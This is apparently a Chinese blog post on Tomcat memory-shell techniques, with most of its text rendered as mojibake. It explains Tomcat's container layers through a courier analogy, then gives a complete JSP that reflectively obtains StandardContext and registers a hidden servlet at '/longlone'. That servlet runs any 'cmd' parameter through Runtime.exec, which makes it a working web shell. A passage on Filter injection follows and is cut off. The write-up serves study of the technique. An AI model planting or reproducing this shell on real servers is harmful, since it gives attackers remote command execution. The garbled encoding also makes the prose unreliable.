id="ä¸€ã€Engineï¼ˆå¼•æ“ï¼‰â€”â€”å¿«é€’æ€»å…¬å¸"><a href="#ä¸€ã€Engineï¼ˆå¼•æ“ï¼‰â€”â€”å¿«é€’æ€»å…¬å¸" class="headerlink" title="ä¸€ã€Engineï¼ˆå¼•æ“ï¼‰â€”â€”å¿«é€’æ€»å…¬å¸"></a><strong>ä¸€ã€Engineï¼ˆå¼•æ“ï¼‰â€”â€”å¿«é€’æ€»å…¬å¸</strong></h3><p><strong>æ¯”å–»</strong>ï¼šEngine å°±åƒå¿«é€’å…¬å¸çš„ <strong>å…¨å›½è°ƒåº¦ä¸­å¿ƒ</strong>ï¼ŒæŒæ¡ç€æ‰€æœ‰åˆ†å…¬å¸çš„ä¿¡æ¯ã€‚<br><strong>æ ¸å¿ƒåŠŸèƒ½</strong>ï¼š</p><ol><li><strong>ç»Ÿç­¹å…¨å±€</strong>ï¼šå½“åŒ…è£¹ï¼ˆHTTPè¯·æ±‚ï¼‰åˆ°è¾¾æ€»å…¬å¸ï¼ŒEngine æ ¹æ®å¿«é€’å•ä¸Šçš„ <strong>æ”¶ä»¶åŸå¸‚</strong>ï¼ˆåŸŸåï¼‰å†³å®šå‘å¾€å“ªä¸ªåŒºåŸŸåˆ†æ‹£ä¸­å¿ƒï¼ˆHostï¼‰</li><li><strong>ä¿åº•æœºåˆ¶</strong>ï¼šå¦‚æœé‡åˆ°å†™ç€ã€Œç«æ˜Ÿå¸‚ã€è¿™ç§ä¸å­˜åœ¨çš„åœ°å€ï¼Œå°±è‡ªåŠ¨è½¬ç»™ <strong>é»˜è®¤åˆ†æ‹£ä¸­å¿ƒ</strong>ï¼ˆdefaultHostï¼‰å¤„ç†</li><li><strong>å¤šçº¿è¿è¥</strong>ï¼šå¯ä»¥ç®¡ç†åŒ—äº¬ã€ä¸Šæµ·ã€å¹¿å·ç­‰å¤šä¸ªåˆ†æ‹£ä¸­å¿ƒï¼ˆæ¯ä¸ª Host å¯¹åº”ä¸€ä¸ªåŸå¸‚ï¼‰</li></ol><p><strong>ä¸¾ä¸ªæ —å­</strong>ğŸŒ°ï¼š<br>å½“ä½ åœ¨æ·˜å®ä¸‹å•ï¼Œå¿«é€’æ€»éƒ¨åˆ†ææ”¶è´§åœ°å€æ˜¯ã€Œä¸Šæµ·å¸‚ã€ï¼Œå°±æŠŠåŒ…è£¹äº¤ç»™ä¸Šæµ·åˆ†æ‹£ä¸­å¿ƒå¤„ç†ã€‚</p><hr><h3 id="äºŒã€Hostï¼ˆè™šæ‹Ÿä¸»æœºï¼‰â€”â€”åŒºåŸŸåˆ†æ‹£ä¸­å¿ƒ"><a href="#äºŒã€Hostï¼ˆè™šæ‹Ÿä¸»æœºï¼‰â€”â€”åŒºåŸŸåˆ†æ‹£ä¸­å¿ƒ" class="headerlink" title="äºŒã€Hostï¼ˆè™šæ‹Ÿä¸»æœºï¼‰â€”â€”åŒºåŸŸåˆ†æ‹£ä¸­å¿ƒ"></a><strong>äºŒã€Hostï¼ˆè™šæ‹Ÿä¸»æœºï¼‰â€”â€”åŒºåŸŸåˆ†æ‹£ä¸­å¿ƒ</strong></h3><p><strong>æ¯”å–»</strong>ï¼šHost æ˜¯ <strong>åŸå¸‚çº§åˆ†æ‹£ä¸­å¿ƒ</strong>ï¼Œæ¯”å¦‚ä¸Šæµ·åˆ†æ‹£ä¸­å¿ƒã€åŒ—äº¬åˆ†æ‹£ä¸­å¿ƒã€‚<br><strong>æ ¸å¿ƒåŠŸèƒ½</strong>ï¼š</p><ol><li><strong>åœ°å€è§£æ</strong>ï¼šæ ¹æ®å¿«é€’å•ä¸Šçš„ <strong>è¯¦ç»†åœ°å€</strong>ï¼ˆURLè·¯å¾„ï¼‰ï¼Œæ‰¾åˆ°å¯¹åº”çš„å°åŒºå¿«é€’ç«™ï¼ˆContextï¼‰</li><li><strong>å¤šç«™ç®¡ç†</strong>ï¼šä¸€ä¸ªåˆ†æ‹£ä¸­å¿ƒå¯ä»¥ç®¡ç†å¤šä¸ªå¿«é€’ç«™ï¼ˆå¦‚ä¸Šæµ·åˆ†æ‹£ä¸­å¿ƒç®¡ç†æµ¦ä¸œç«™ã€è™¹æ¡¥ç«™ç­‰ï¼‰</li><li><strong>è§„åˆ™æ‰‹å†Œ</strong>ï¼šåˆ†æ‹£ä¸­å¿ƒæœ‰æœ¬ã€Šå¿«é€’å¤„ç†æŒ‡å—ã€‹ï¼ˆweb.xmlï¼‰ï¼Œå‘Šè¯‰å‘˜å·¥é‡åˆ°ä¸åŒåœ°å€æ€ä¹ˆå¤„ç†</li></ol><p><strong>ä¸¾ä¸ªæ —å­</strong>ğŸŒ°ï¼š<br>ä¸Šæµ·åˆ†æ‹£ä¸­å¿ƒæ”¶åˆ°å†™ç€ã€Œæµ¦ä¸œæ–°åŒºå¼ æ±Ÿè·¯123å·ã€çš„åŒ…è£¹ï¼ŒåŒ¹é…åˆ°å¼ æ±Ÿå¿«é€’ç«™ã€‚</p><hr><h3 id="ä¸‰ã€Contextï¼ˆä¸Šä¸‹æ–‡ï¼‰â€”â€”å°åŒºå¿«é€’ç«™"><a href="#ä¸‰ã€Contextï¼ˆä¸Šä¸‹æ–‡ï¼‰â€”â€”å°åŒºå¿«é€’ç«™" class="headerlink" title="ä¸‰ã€Contextï¼ˆä¸Šä¸‹æ–‡ï¼‰â€”â€”å°åŒºå¿«é€’ç«™"></a><strong>ä¸‰ã€Contextï¼ˆä¸Šä¸‹æ–‡ï¼‰â€”â€”å°åŒºå¿«é€’ç«™</strong></h3><p><strong>æ¯”å–»</strong>ï¼šContext å°±åƒä½ å®¶å°åŒºçš„ <strong>èœé¸Ÿé©¿ç«™</strong>ï¼Œç®¡ç†ç€æœ¬å°åŒºçš„æ‰€æœ‰å¿«é€’ã€‚<br><strong>æ ¸å¿ƒåŠŸèƒ½</strong>ï¼š</p><ol><li><strong>åŒ…è£¹åˆ†ç±»</strong>ï¼šé©¿ç«™æ ¹æ®å¿«é€’å•å·ï¼ˆURLè·¯å¾„ï¼‰æŠŠåŒ…è£¹åˆ†ç»™ä¸åŒå¿«é€’å‘˜ï¼ˆServletï¼‰</li><li><strong>èµ„æºç®¡ç†</strong>ï¼šé©¿ç«™æœ‰è´§æ¶ï¼ˆServletå®¹å™¨ï¼‰ã€ç›‘æ§ç³»ç»Ÿï¼ˆListenerï¼‰ã€æ¶ˆæ¯’è®¾å¤‡ï¼ˆFilterï¼‰ç­‰å…¨å¥—è®¾æ–½</li><li><strong>åº”æ€¥å¤„ç†</strong>ï¼šå¦‚æœé‡åˆ°æ²¡æœ‰æ ‡æ³¨å¿«é€’å‘˜çš„åŒ…è£¹ï¼Œå°±æŒ‰ã€Šé»˜è®¤æ´¾é€è§„åˆ™ã€‹ï¼ˆweb.xmlï¼‰å¤„ç†</li></ol><p><strong>ä¸¾ä¸ªæ —å­</strong>ğŸŒ°ï¼š<br>å¼ æ±Ÿé©¿ç«™æ”¶åˆ°æ ‡æ³¨ã€Œ3æ ‹502ç‹å…ˆç”Ÿã€çš„åŒ…è£¹ï¼Œäº¤ç»™è´Ÿè´£3æ ‹çš„å¿«é€’å‘˜å°ç‹ã€‚</p><hr><h3 id="å››ã€Wrapperï¼ˆåŒ…è£…å™¨ï¼‰â€”â€”å¿«é€’å‘˜"><a href="#å››ã€Wrapperï¼ˆåŒ…è£…å™¨ï¼‰â€”â€”å¿«é€’å‘˜" class="headerlink" title="å››ã€Wrapperï¼ˆåŒ…è£…å™¨ï¼‰â€”â€”å¿«é€’å‘˜"></a><strong>å››ã€Wrapperï¼ˆåŒ…è£…å™¨ï¼‰â€”â€”å¿«é€’å‘˜</strong></h3><p><strong>æ¯”å–»</strong>ï¼šWrapper å°±æ˜¯ <strong>è´Ÿè´£é€è´§çš„å¿«é€’å°å“¥</strong>ï¼Œæ¯ä¸ªå°å“¥ä¸“é€ä¸€æ ‹æ¥¼ã€‚<br><strong>æ ¸å¿ƒåŠŸèƒ½</strong>ï¼š</p><ol><li><strong>ä¸“å±æœåŠ¡</strong>ï¼šæ¯ä¸ªå¿«é€’å‘˜åªè´Ÿè´£ç‰¹å®šæ¥¼æ ‹ï¼ˆä¸€ä¸ª Wrapper å¯¹åº”ä¸€ä¸ª Servlet ç±»ï¼‰  </li><li><strong>å…¨æµç¨‹ç®¡ç†</strong>ï¼šä»æ¥å•â†’å–è´§â†’é€è´§â†’ç­¾æ”¶ï¼ˆServlet çš„ init()â†’service()â†’destroy()ï¼‰å…¨ç¨‹è·Ÿè¿›</li><li><strong>ä¸å¯åˆ†å‰²</strong>ï¼šå¿«é€’å‘˜ä¸èƒ½æŠŠè‡ªå·±çš„ç‰‡åŒºå†åˆ†åŒ…ç»™åˆ«äººï¼ˆWrapper ä¸èƒ½æœ‰å­å®¹å™¨ï¼‰</li></ol><p><strong>ä¸¾ä¸ªæ —å­</strong>ğŸŒ°ï¼š<br>å¿«é€’å‘˜å°ç‹æ¥åˆ°3æ ‹502çš„è®¢å•ï¼Œä»é©¿ç«™å–ä»¶â†’é€è´§â†’è®©å®¢æˆ·ç­¾æ”¶ã€‚</p><hr><h3 id="äº”ã€å››è€…åä½œæµç¨‹å›¾"><a href="#äº”ã€å››è€…åä½œæµç¨‹å›¾" class="headerlink" title="äº”ã€å››è€…åä½œæµç¨‹å›¾"></a><strong>äº”ã€å››è€…åä½œæµç¨‹å›¾</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æµè§ˆå™¨ä¸‹å• â†’ æ€»å…¬å¸(Engine) â†’ ä¸Šæµ·åˆ†æ‹£ä¸­å¿ƒ(Host) â†’ å¼ æ±Ÿé©¿ç«™(Context) â†’ 3æ ‹å¿«é€’å‘˜(Wrapper)</span><br><span class="line">       â†“           â†“               â†“               â†“</span><br><span class="line">    HTTPè¯·æ±‚ â†’ æŒ‰åŸŸååˆ†å‘ â†’ æŒ‰URLè·¯å¾„åŒ¹é… â†’ æ‰§è¡ŒServleté€»è¾‘</span><br></pre></td></tr></table></figure><hr><h3 id="å…­ã€ä¸€å¥è¯æ€»ç»“"><a href="#å…­ã€ä¸€å¥è¯æ€»ç»“" class="headerlink" title="å…­ã€ä¸€å¥è¯æ€»ç»“"></a><strong>å…­ã€ä¸€å¥è¯æ€»ç»“</strong></h3><p>â€¢ <strong>Engine</strong> æ˜¯çœ‹å¿«é€’å• <strong>æ”¶ä»¶åŸå¸‚</strong> çš„æ€»è°ƒåº¦<br>â€¢ <strong>Host</strong> æ˜¯æŒ‰ <strong>è¯¦ç»†åœ°å€</strong> æ‰¾å¿«é€’ç«™çš„å¯¼èˆªä»ª<br>â€¢ <strong>Context</strong> æ˜¯ç®¡ç† <strong>å°åŒºå†…æ‰€æœ‰å¿«é€’</strong> çš„é©¿ç«™<br>â€¢ <strong>Wrapper</strong> æ˜¯è´Ÿè´£ <strong>é€è´§åˆ°é—¨</strong> çš„å¿«é€’å°å“¥  </p><p>å°±åƒå¿«é€’ç½‘ç»œéœ€è¦å±‚å±‚åˆ†æ‹£ï¼ŒTomcat é€šè¿‡è¿™å››å±‚å®¹å™¨ç²¾å‡†è·¯ç”±æ¯ä¸ªè¯·æ±‚</p><p>å…¶ä¸­webappsæ–‡ä»¶å¤¹å³æ˜¯æˆ‘ä»¬çš„Hostï¼Œwebappsä¸­çš„æ–‡ä»¶å¤¹(å¦‚examples&#x2F;ROOT)ä»£è¡¨ä¸€ä¸ªContextï¼Œæ¯ä¸ªContextå†…åŒ…å«Wrapperï¼ŒWrapper åˆ™è´Ÿè´£ç®¡ç†å®¹å™¨å†…çš„ Servletã€‚</p><p>å› ä¸ºè¿™é‡Œé…ç½®ç¯å¢ƒæœ‰ç‚¹éº»çƒ¦æˆ‘ç›´æ¥æ‹¿æ–‡ç« è¿›è¡Œ</p><p>è§£é‡Šä¸‹Servletçš„ç”Ÿå‘½å‘¨æœŸ</p><h2 id="Servletåˆå§‹åŒ–æµç¨‹åˆ†"><a href="#Servletåˆå§‹åŒ–æµç¨‹åˆ†" class="headerlink" title="Servletåˆå§‹åŒ–æµç¨‹åˆ†"></a>Servletåˆå§‹åŒ–æµç¨‹åˆ†</h2><ol><li>é€šè¿‡ context.createWapper() åˆ›å»º Wapper å¯¹è±¡</li><li>è®¾ç½® Servlet çš„ LoadOnStartUp çš„å€¼(åç»­åˆ†æä¸ºä»€ä¹ˆåŠ¨æ€æ³¨å†ŒServletéœ€è¦è®¾ç½®è¯¥å±æ€§)</li><li>è®¾ç½® Servlet çš„ Name</li><li>è®¾ç½® Servlet å¯¹åº”çš„ Class</li><li>å°† Servlet æ·»åŠ åˆ° context çš„ children ä¸­</li><li>å°† url è·¯å¾„å’Œ servlet ç±»åšæ˜ å°„</li></ol><h2 id="å†…å­˜é©¬å®ç°æµç¨‹åˆ†æ"><a href="#å†…å­˜é©¬å®ç°æµç¨‹åˆ†æ" class="headerlink" title="å†…å­˜é©¬å®ç°æµç¨‹åˆ†æ#"></a>å†…å­˜é©¬å®ç°æµç¨‹åˆ†æ<a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/#%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90">#</a></h2><p>æ ¹æ®ä¸Šè¿°çš„æµç¨‹åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥æ¨¡ä»¿ä¸Šè¿°çš„åŠ è½½æœºåˆ¶æ‰‹åŠ¨æ³¨å†Œä¸€ä¸ªservlet:</p><ol><li><p>æ‰¾åˆ°StandardContext</p></li><li><p>ç»§æ‰¿å¹¶ç¼–å†™ä¸€ä¸ªæ¶æ„servlet</p></li><li><p>é€šè¿‡ context.createWapper() åˆ›å»º Wapper å¯¹è±¡</p></li><li><p>è®¾ç½® Servlet çš„ LoadOnStartUp çš„å€¼</p></li><li><p>è®¾ç½® Servlet çš„ Name</p></li><li><p>è®¾ç½® Servlet å¯¹åº”çš„ Class</p></li><li><p>å°† Servlet æ·»åŠ åˆ° context çš„ children ä¸­</p></li><li><p>å°† url è·¯å¾„å’Œ servlet ç±»åšæ˜ å°„</p><p>leran from:<a href="https://www.cnblogs.com/erosion2020/p/18575039">https://www.cnblogs.com/erosion2020/p/18575039</a></p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.annotation.WebServlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServletResponse&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">S</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span>&#123;</span><br><span class="line"></span><br><span class="line">â€‹    <span class="meta">@Override</span></span><br><span class="line">â€‹    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">â€‹    &#125;</span><br><span class="line"></span><br><span class="line">â€‹    <span class="meta">@Override</span></span><br><span class="line">â€‹    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">â€‹        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">â€‹    &#125;</span><br><span class="line"></span><br><span class="line">â€‹    <span class="meta">@Override</span></span><br><span class="line">â€‹    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">â€‹        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">â€‹        <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">â€‹            <span class="keyword">try</span> &#123;</span><br><span class="line">â€‹                Runtime.getRuntime().exec(cmd);</span><br><span class="line">â€‹            &#125; <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line">â€‹        &#125;</span><br><span class="line">â€‹    &#125;</span><br><span class="line"></span><br><span class="line">â€‹    <span class="meta">@Override</span></span><br><span class="line">â€‹    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">â€‹        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">â€‹    &#125;</span><br><span class="line"></span><br><span class="line">â€‹    <span class="meta">@Override</span></span><br><span class="line">â€‹    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">â€‹    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// ServletContext servletContext =  request.getServletContext();</span></span><br><span class="line">    <span class="comment">// Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span></span><br><span class="line">    <span class="comment">// appctx.setAccessible(true);</span></span><br><span class="line">    <span class="comment">// ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span></span><br><span class="line">    <span class="comment">// Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span></span><br><span class="line">    <span class="comment">// stdctx.setAccessible(true);</span></span><br><span class="line">    <span class="comment">// StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ›´ç®€å•çš„æ–¹æ³• è·å–StandardContext</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"></span><br><span class="line"><span class="type">S</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">S</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> servlet.getClass().getSimpleName();</span><br><span class="line"><span class="type">Wrapper</span> <span class="variable">newWrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">newWrapper.setName(name);</span><br><span class="line">newWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">newWrapper.setServlet(servlet);</span><br><span class="line">newWrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">standardContext.addChild(newWrapper);</span><br><span class="line">standardContext.addServletMappingDecoded(<span class="string">&quot;/longlone&quot;</span>, name);</span><br><span class="line"></span><br><span class="line">out.println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><strong>Servlet å†…å­˜é©¬</strong> å¹¶ä¸æ˜¯ â€œçº¯ç²¹â€ çš„å†…å­˜é©¬ï¼Œå®ƒå¹¶æ²¡æœ‰å®Œå…¨è¾¾åˆ°å†…å­˜é©¬çš„æ— æ–‡ä»¶è½åœ°çš„ç‰¹ç‚¹ã€‚ç¡®å®ï¼Œ<strong>å†…å­˜é©¬çš„åŸå§‹æ„å›¾</strong>æ˜¯é€šè¿‡ä»…åœ¨å†…å­˜ä¸­è¿è¡Œï¼Œé¿å…æ–‡ä»¶ç³»ç»Ÿçš„å­˜åœ¨æˆ–ç—•è¿¹ï¼Œä½†é€šè¿‡ JSP æ–‡ä»¶æˆ–å…¶ä»–å½¢å¼çš„æ¶æ„æ–‡ä»¶è½½å…¥å’Œè§¦å‘ï¼Œ<strong>Servlet å†…å­˜é©¬</strong>ä»ç„¶éœ€è¦ä¾èµ–äºåˆå§‹çš„æ–‡ä»¶è½åœ°å’Œ Tomcat é‡æ–°åŠ è½½ã€‚è¿™ä½¿å¾—å®ƒä¸ä¼ ç»Ÿçš„å†…å­˜é©¬ï¼ˆå®Œå…¨åœ¨å†…å­˜ä¸­æ‰§è¡Œï¼Œä¸ä¾èµ–äºæ–‡ä»¶ï¼‰æœ‰æ‰€ä¸åŒã€‚</p></li></ol><h1 id="Tomcat-Filter"><a href="#Tomcat-Filter" class="headerlink" title="Tomcat-Filter"></a>Tomcat-Filter</h1><p>æˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹åœ¨Tomcatä¸­ä¸Filterå¯†åˆ‡ç›¸å…³çš„å‡ ä¸ªç±»:<br>- FilterDefsï¼šå­˜æ”¾FilterDefçš„æ•°ç»„ ï¼ŒFilterDef ä¸­å­˜å‚¨ç€æˆ‘ä»¬è¿‡æ»¤å™¨åï¼Œè¿‡æ»¤å™¨å®ä¾‹ï¼Œä½œç”¨ url ç­‰åŸºæœ¬ä¿¡æ¯<br>- FilterConfigsï¼šå­˜æ”¾filterConfigçš„æ•°ç»„ï¼Œåœ¨ FilterConfig ä¸­ä¸»è¦å­˜æ”¾ FilterDef å’Œ Filterå¯¹è±¡ç­‰ä¿¡æ¯<br>- FilterMapsï¼šå­˜æ”¾FilterMapçš„æ•°ç»„ï¼Œåœ¨ FilterMap ä¸­ä¸»è¦å­˜æ”¾äº† FilterName å’Œ å¯¹åº”çš„URLPattern<br>- FilterChainï¼šè¿‡æ»¤å™¨é“¾ï¼Œè¯¥å¯¹è±¡ä¸Šçš„ doFilter æ–¹æ³•èƒ½ä¾æ¬¡è°ƒç”¨é“¾ä¸Šçš„ Filter<br>- WebXmlï¼šå­˜æ”¾ web.xml ä¸­å†…å®¹çš„ç±»<br>- ContextConfigï¼šWebåº”ç”¨çš„ä¸Šä¸‹æ–‡é…ç½®ç±»<br>- StandardContextï¼šContextæ¥å£çš„æ ‡å‡†å®ç°ç±»ï¼Œä¸€ä¸ª Context ä»£è¡¨ä¸€ä¸ª Web åº”ç”¨ï¼Œå…¶ä¸‹å¯ä»¥åŒ…å«å¤šä¸ª Wrapper<br>- StandardWrapperValveï¼šä¸€ä¸ª Wrapper çš„æ ‡å‡†å®ç°ç±»ï¼Œä¸€ä¸ª Wrapper ä»£è¡¨ä¸€ä¸ªServlet</p><hr><h3 id="ä¸€ã€å…³é”®è§’è‰²å¯¹ç…§è¡¨"><a href="#ä¸€ã€å…³é”®è§’è‰²å¯¹ç…§è¡¨" class="headerlink" title="ä¸€ã€å…³é”®è§’è‰²å¯¹ç…§è¡¨"></a><strong>ä¸€ã€å…³é”®è§’è‰²å¯¹ç…§è¡¨</strong></h3><table><thead><tr><th><strong>Tomcatç±»</strong></th><th><strong>å¿«é€’åˆ†æ‹£ä¸­å¿ƒæ¯”å–»</strong></th><th><strong>æ ¸å¿ƒä½œç”¨</strong></th></tr></thead><tbody><tr><td><strong>FilterDefs</strong></td><td>åˆ†æ‹£å‘˜æ¡£æ¡ˆåº“ ğŸ“</td><td>å­˜æ‰€æœ‰åˆ†æ‹£å‘˜ï¼ˆFilterï¼‰çš„èº«ä»½è¯ï¼ˆåç§°ã€ç±»åã€åˆå§‹åŒ–å‚æ•°ï¼‰</td></tr><tr><td><strong>FilterConfigs</strong></td><td>åˆ†æ‹£å‘˜å·¥ä½œæ‰‹å†Œ ğŸ“–</td><td>å­˜åˆ†æ‹£å‘˜çš„å·¥ä½œæŒ‡å—ï¼ˆFilterå®ä¾‹ + é…ç½®ä¿¡æ¯ï¼‰</td></tr><tr><td><strong>FilterMaps</strong></td><td>åˆ†æ‹£è§„åˆ™è¡¨ ğŸ“‹</td><td>è®°å½•å“ªäº›åˆ†æ‹£å‘˜è´Ÿè´£å“ªäº›åŒºåŸŸçš„åŒ…è£¹ï¼ˆURLåŒ¹é…è§„åˆ™ï¼‰</td></tr><tr><td><strong>FilterChain</strong></td><td>åˆ†æ‹£æµæ°´çº¿ ğŸšš</td><td>æ§åˆ¶åŒ…è£¹ä¾æ¬¡ç»è¿‡å¤šä¸ªåˆ†æ‹£å‘˜å¤„ç†</td></tr><tr><td><strong>WebXml</strong></td><td>å®˜æ–¹åˆ†æ‹£è§„åˆ™æ€»çº² ğŸ“œ</td><td>ä»web.xmlé‡Œè§£æå‡ºæ¥çš„åŸå§‹è§„åˆ™ï¼ˆé™æ€é…ç½®ï¼‰</td></tr><tr><td><strong>ContextConfig</strong></td><td>åˆ†æ‹£ä¸­å¿ƒé…ç½®éƒ¨ ğŸ› ï¸</td><td>æ ¹æ®æ€»çº²ï¼ˆWebXmlï¼‰ç”Ÿæˆå®é™…çš„åˆ†æ‹£è§„åˆ™</td></tr><tr><td><strong>StandardContext</strong></td><td>åˆ†æ‹£ä¸­å¿ƒç®¡ç†ç³»ç»Ÿ ğŸ’»</td><td>ç»Ÿç­¹æ‰€æœ‰åˆ†æ‹£å‘˜ã€åŒ…è£¹æµè½¬ã€è§„åˆ™æ‰§è¡Œ</td></tr><tr><td><strong>StandardWrapperValve</strong></td><td>åŒ…è£¹æ´¾é€å‘˜ ğŸšš</td><td>æœ€ç»ˆæŠŠåŒ…è£¹é€åˆ°æ”¶ä»¶äººï¼ˆServletï¼‰æ‰‹é‡Œ</td></tr></tbody></table><hr><h3 id="äºŒã€Filterå¤„ç†æµç¨‹ï¼ˆåŒ…è£¹åˆ†æ‹£ç‰ˆï¼‰"><a href="#äºŒã€Filterå¤„ç†æµç¨‹ï¼ˆåŒ…è£¹åˆ†æ‹£ç‰ˆï¼‰" class="headerlink" title="äºŒã€Filterå¤„ç†æµç¨‹ï¼ˆåŒ…è£¹åˆ†æ‹£ç‰ˆï¼‰"></a><strong>äºŒã€Filterå¤„ç†æµç¨‹ï¼ˆåŒ…è£¹åˆ†æ‹£ç‰ˆï¼‰</strong></h3><p><strong>å‡è®¾ä¸€ä¸ªå¿«é€’ï¼ˆHTTPè¯·æ±‚ï¼‰è¿›å…¥åˆ†æ‹£ä¸­å¿ƒï¼ˆTomcatï¼‰ï¼š</strong></p><p>1ï¸âƒ£ <strong>æŸ¥åˆ†æ‹£è§„åˆ™è¡¨ï¼ˆFilterMapsï¼‰</strong><br>   â€¢ ç³»ç»Ÿæ ¹æ®å¿«é€’å•åœ°å€ï¼ˆURLè·¯å¾„ï¼‰ï¼Œä» <strong>åˆ†æ‹£è§„åˆ™è¡¨</strong> é‡Œæ‰¾å‡ºè¦ç»è¿‡å“ªäº›åˆ†æ‹£å‘˜ï¼ˆFilteré¡ºåºï¼‰<br>   â€¢ <em>æ¯”å¦‚ä¸Šæµ·çš„åŒ…è£¹è¦ç»è¿‡ï¼šå®‰æ£€å‘˜â†’æ¶ˆæ¯’å‘˜â†’åˆ†ç±»å‘˜</em></p><p>2ï¸âƒ£ <strong>ç»„è£…é…é€æµæ°´çº¿ï¼ˆFilterChainï¼‰</strong><br>   â€¢ æŒ‰æŸ¥åˆ°çš„é¡ºåºï¼ŒæŠŠå¯¹åº”çš„åˆ†æ‹£å‘˜ï¼ˆFilterï¼‰æ’æˆæµæ°´çº¿ï¼š<br>     <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">     chain = [å®‰æ£€Filter, æ¶ˆæ¯’Filter, åˆ†ç±»Filter]  </span><br><span class="line">     ```  </span><br><span class="line">   â€¢ æœ€åä¸€æ­¥äº¤ç»™æ´¾é€å‘˜ï¼ˆStandardWrapperValveï¼‰å¤„ç†  </span><br><span class="line"></span><br><span class="line"><span class="number">3</span>ï¸âƒ£ **åˆ†æ‹£å‘˜é€ä¸ªå¤„ç†ï¼ˆdoFilterï¼‰**  </span><br><span class="line">   æ¯ä¸ªåˆ†æ‹£å‘˜æŒ‰è‡ªå·±çš„èŒè´£æ“ä½œåŒ…è£¹ï¼ˆRequest/Responseï¼‰ï¼š  </span><br><span class="line">   â€¢ **å®‰æ£€å‘˜**ï¼šæ‹†å¼€åŒ…è£¹çœ‹æœ‰æ²¡æœ‰è¿ç¦å“ï¼ˆæ£€æŸ¥è¯·æ±‚å¤´ï¼‰  </span><br><span class="line">   â€¢ **æ¶ˆæ¯’å‘˜**ï¼šç»™åŒ…è£¹å–·æ¶ˆæ¯’æ¶²ï¼ˆå‚æ•°è¿‡æ»¤ï¼‰  